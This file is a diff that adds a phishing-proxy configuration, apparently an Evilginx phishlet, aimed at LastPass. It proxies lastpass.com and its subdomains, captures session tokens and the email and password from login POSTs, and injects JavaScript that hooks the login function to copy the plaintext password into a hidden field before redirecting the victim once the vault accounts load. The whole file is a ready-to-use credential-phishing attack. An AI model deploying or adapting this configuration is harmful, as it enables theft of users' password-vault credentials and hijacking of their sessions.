@@ -1,0 +1,72 @@
+name: 'lastpass'
+author: '@__pberba__'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'lastpass.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'lastpass.com'}
+  - {phish_sub: 'lp-cdn', orig_sub: 'lp-cdn', domain: 'lastpass.com'}
+
+
+sub_filters: []
+  # - {triggers_on: 'github.com', orig_sub: '', domain: 'github.com', search: 'integrity="(.*?)"', replace: '', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: 'lastpass.com'
+    keys: [
+      '/getaccts.php', 
+      '/iterations.php'
+    ]
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'lastpass.com'
+  path: '/?ac=1&lpnorefresh=1'
+
+js_inject:
+  - trigger_domains: ["lastpass.com"]
+    trigger_paths: ["/"]
+    trigger_params: []
+    script: |
+      if ((typeof _startLogin === 'undefined') && (typeof startLogin !== 'undefined')) {
+        
+        _startLogin = startLogin;
+        startLogin = function() {
+          var form = document.getElementById("loginform");
+
+          var hidden_password = document.getElementById("_password");
+          if(!hidden_password) {
+            hidden_password = document.createElement("input");
+            hidden_password.type = "hidden";
+            hidden_password.id = "_password";
+            hidden_password.name = "_password";
+            form.appendChild(hidden_password);
+          }
+
+          var password = document.querySelector("#password").value;
+          hidden_password.value = password;
+
+          _startLogin();
+        }
+        console.log("Injecting login code...")
+      }
+
+      if ((typeof _postacctsload === 'undefined') && (typeof postacctsload !== 'undefined')) {
+        _postacctsload = postacctsload;
+        postacctsload = function() {
+          // Redirect once credentials are loaded
+          window.location.href = "{{REDIRECT_URL}}";
+          _postacctsload();
+        }
+        console.log("Injecting post accounts code...")
+      }
+      
+      
